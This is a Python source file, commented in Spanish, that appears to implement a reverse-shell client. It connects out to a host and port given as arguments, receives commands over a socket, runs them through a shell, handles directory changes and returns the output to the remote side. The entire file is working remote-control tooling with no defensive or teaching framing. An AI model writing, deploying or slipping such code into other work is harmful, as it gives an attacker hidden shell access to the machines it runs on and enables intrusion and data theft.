import subprocess
import threading
import os
import socket
import sys


FIN_COMANDO = b'#00#'

def ejecutar_comando(comando):
    """
    Esta función ejecuta un comando y regresa la salida binaria producida
    En caso de error la función regresa False
    Comando viene como cadena binaria
    """
    comando = comando.decode('utf-8') 
    proc = subprocess.Popen(comando, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    salida, error = proc.communicate()
    if error:
        return False
    return salida


def ejecutar_cd(ruta):
    try:
        os.chdir(ruta)
        return b''
    except FileNotFoundError:
        return False


def leer_comando(servidor):
    """
    Lee el canal de comunicación del cliente y reconstruye
    el comando asociado
    """
    comando = servidor.recv(2048)
    while not comando.endswith(FIN_COMANDO):
        comando += servidor.recv(2048)
    a_quitar_caracteres = len(FIN_COMANDO)
    return comando[:-a_quitar_caracteres]

def mandar_mensaje(mensaje, socket):
    """
    Envia un mensaje a través del socket establecido
    El mensaje debe ser una cadena binaria
    """
    mensaje += FIN_COMANDO
    socket.send(mensaje)
    

def extraer_ruta_cd(comando):
    """
    Parsea un comando cd de la forma: cd ruta
    Regresa ruta
    """
    partes = comando.split(b' ')
    if len(partes) != 2: # error
        return False
    return partes[1]

def atender_servidor(servidor):
    comando = ''
    while comando != b'exit':
        comando = leer_comando(servidor)
        if comando.startswith(b'cd'):
            ruta = extraer_ruta_cd(comando)
            if ruta == False:
                salida = False
            else:
                salida = ejecutar_cd(ruta)
        else:
            salida = ejecutar_comando(comando)
        if salida == False: # hubo un error
            mandar_mensaje(b'El comando anterior produjo un error', servidor)
        else:
            mandar_mensaje(salida, servidor)

#------------------------------------------------------------------------------

#--------------------------------------------------------------------------

def inicializar_conexion(host, puerto):
    cliente = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        cliente.connect((host, puerto))
    except:
        print('No se pudo establecer conexión con el servidor')
        exit(1)
    return cliente


if __name__ == '__main__':
    host = sys.argv[1]
    puerto = int(sys.argv[2])
    socket = inicializar_conexion(host, puerto)
    atender_servidor(socket)